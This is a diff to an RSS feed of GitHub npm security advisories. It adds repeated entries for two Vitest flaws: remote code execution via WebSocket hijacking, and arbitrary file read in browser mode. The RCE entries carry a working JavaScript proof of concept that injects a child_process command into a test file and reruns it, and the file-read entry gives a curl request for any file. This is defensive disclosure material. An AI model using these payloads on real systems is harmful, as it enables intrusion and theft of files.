@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2025-02-04T16:01:27.386Z</updated>
+    <updated>2025-02-04T17:01:28.484Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,342 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
+        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
+        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
+        <updated>2025-02-04T17:00:58.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
+<h3 id="details">Details</h3>
+<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
+<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Open Vitest UI.</li>
+<li>Access a malicious web site with the script below.</li>
+<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
+</ol>
+<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
+const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});
+
+// actual code to run
+const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
+ws.addEventListener('message', e =&gt; {
+    console.log(e.data)
+})
+ws.addEventListener('open', () =&gt; {
+    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))
+
+    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"
+
+    // edit file content to inject command execution
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "saveTestFile",
+      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
+    }))
+    // rerun the tests to run the injected command execution code
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "rerun",
+      a: [testFilePath]
+    }))
+})
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
+<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-02-04T17:00:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
+        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
+        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
+        <updated>2025-02-04T17:00:58.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
+<h3 id="details">Details</h3>
+<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
+<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Open Vitest UI.</li>
+<li>Access a malicious web site with the script below.</li>
+<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
+</ol>
+<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
+const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});
+
+// actual code to run
+const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
+ws.addEventListener('message', e =&gt; {
+    console.log(e.data)
+})
+ws.addEventListener('open', () =&gt; {
+    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))
+
+    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"
+
+    // edit file content to inject command execution
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "saveTestFile",
+      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
+    }))
+    // rerun the tests to run the injected command execution code
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "rerun",
+      a: [testFilePath]
+    }))
+})
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
+<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-02-04T17:00:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
+        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
+        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
+        <updated>2025-02-04T17:00:58.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
+<h3 id="details">Details</h3>
+<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
+<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Open Vitest UI.</li>
+<li>Access a malicious web site with the script below.</li>
+<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
+</ol>
+<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
+const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});
+
+// actual code to run
+const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
+ws.addEventListener('message', e =&gt; {
+    console.log(e.data)
+})
+ws.addEventListener('open', () =&gt; {
+    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))
+
+    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"
+
+    // edit file content to inject command execution
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "saveTestFile",
+      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
+    }))
+    // rerun the tests to run the injected command execution code
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "rerun",
+      a: [testFilePath]
+    }))
+})
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
+<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-02-04T17:00:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
+        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
+        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
+        <updated>2025-02-04T17:00:58.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
+<h3 id="details">Details</h3>
+<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
+<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
+<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Open Vitest UI.</li>
+<li>Access a malicious web site with the script below.</li>
+<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
+</ol>
+<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
+const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});
+
+// actual code to run
+const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
+ws.addEventListener('message', e =&gt; {
+    console.log(e.data)
+})
+ws.addEventListener('open', () =&gt; {
+    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))
+
+    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"
+
+    // edit file content to inject command execution
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "saveTestFile",
+      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
+    }))
+    // rerun the tests to run the injected command execution code
+    ws.send(Flatted.stringify({
+      t: 'q',
+      i: crypto.randomUUID(),
+      m: "rerun",
+      a: [testFilePath]
+    }))
+})
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
+<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-02-04T17:00:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@vitest/browser] Vitest browser mode serves arbitrary files]]></title>
+        <id>https://github.com/advisories/GHSA-8gvc-j273-4wm5</id>
+        <link href="https://github.com/advisories/GHSA-8gvc-j273-4wm5"/>
+        <updated>2025-02-04T16:51:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>__screenshot-error</code> handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a>, an attacker can send a request to that handler from remote to get the content of arbitrary files.</p>
+<h3 id="details">Details</h3>
+<p>This <code>__screenshot-error</code> handler on the browser mode HTTP server responds any file on the file system.
+<a href="https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></p>
+<p>This code was added by <a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a>.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a directory and change the current directory to that directory</li>
+<li>Run <code>npx vitest init browser</code></li>
+<li>Run <code>npm run test:browser</code></li>
+<li>Run <code>curl http://localhost:63315/__screenshot-error?file=/path/to/any/file</code></li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Users explicitly exposing the browser mode server to the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a> may get any files exposed.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5">https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf">https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf</a></li>
+<li><a href="https://github.com/advisories/GHSA-8gvc-j273-4wm5">https://github.com/advisories/GHSA-8gvc-j273-4wm5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8gvc-j273-4wm5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-02-04T16:51:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@vitest/browser] Vitest browser mode serves arbitrary files]]></title>
+        <id>https://github.com/advisories/GHSA-8gvc-j273-4wm5</id>
+        <link href="https://github.com/advisories/GHSA-8gvc-j273-4wm5"/>
+        <updated>2025-02-04T16:51:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>__screenshot-error</code> handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a>, an attacker can send a request to that handler from remote to get the content of arbitrary files.</p>
+<h3 id="details">Details</h3>
+<p>This <code>__screenshot-error</code> handler on the browser mode HTTP server responds any file on the file system.
+<a href="https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></p>
+<p>This code was added by <a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a>.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a directory and change the current directory to that directory</li>
+<li>Run <code>npx vitest init browser</code></li>
+<li>Run <code>npm run test:browser</code></li>
+<li>Run <code>curl http://localhost:63315/__screenshot-error?file=/path/to/any/file</code></li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Users explicitly exposing the browser mode server to the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a> may get any files exposed.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5">https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a></li>
+<li><a href="https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf">https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf</a></li>
+<li><a href="https://github.com/advisories/GHSA-8gvc-j273-4wm5">https://github.com/advisories/GHSA-8gvc-j273-4wm5</a></li>
+</ul>
+]]></content>
+        <author>
